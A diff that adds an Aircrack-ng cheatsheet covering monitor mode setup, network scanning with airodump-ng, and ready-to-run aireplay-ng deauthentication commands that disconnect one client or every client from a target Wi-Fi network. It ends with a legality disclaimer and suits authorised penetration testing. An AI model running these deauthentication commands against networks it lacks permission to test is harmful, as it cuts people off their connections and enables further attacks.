@@ -1,0 +1,57 @@
+Aircrack-ng & Wi-Fi Monitor Mode Cheatsheet
+
+A quick GitHub-style reference for setting up and using Aircrack-ng suite tools for Wi-Fi penetration testing and deauthentication attacks.
+
+Installation
+
+# Install aircrack-ng
+sudo pacman -S aircrack-ng
+
+# Install iw
+sudo pacman -S iw
+
+Set Up Monitor Mode
+
+1. List Wireless Interfaces:
+sudo airmon-ng
+- Copy the name of your Wi-Fi card interface (e.g., wlan0).
+
+2. Enable Monitor Mode:
+sudo airmon-ng start <wifi-card-interface>
+# Example: sudo airmon-ng start wlan0
+- Note: Your interface will switch to monitor mode (e.g., wlan0mon). Internet will be unavailable via Wi-Fi in monitor mode.
+
+3. Check Interfaces (Monitor Mode):
+sudo airmon-ng
+- Copy the new interface name (it may have "mon" appended ex wlo1->wlo1mon).
+
+Scanning for Networks
+
+sudo airodump-ng <monitor-interface>
+# Example: sudo airodump-ng wlan0mon
+- Copy the BSSID and channel number of the target Wi-Fi network.
+
+Set Channel
+
+sudo iw dev <monitor-interface> set channel <channel-number>
+# Example: sudo iw dev wlan0mon set channel 6
+
+Deauthentication Attack
+
+sudo aireplay-ng --deauth <count> -a <BSSID> [-c <Client MAC>] <monitor-interface>
+# Example (target all clients):
+sudo aireplay-ng --deauth 10 -a 58:95:D8:23:F8:05 wlan0mon
+# Example (target specific client):
+sudo aireplay-ng --deauth 10 -a 58:95:D8:23:F8:05 -c 12:34:56:78:9A:BC wlan0mon
+
+- --deauth 10 : Send 10 deauth packets
+- <BSSID> : The Wi-Fi router’s BSSID (from previous airodump-ng step)
+- -c <Client MAC> : (Optional) Target a specific client’s MAC address. Omit to attack all.
+- <monitor-interface> : Your monitor-mode interface (e.g., wlan0mon)
+
+Restore Normal Wi-Fi
+
+sudo airmon-ng stop <monitor-interface>
+# Example: sudo airmon-ng stop wlan0mon
+
+Note: Deauthentication attacks are illegal on networks you do not own or have explicit permission to test. Only use these commands in a legal and ethical manner.
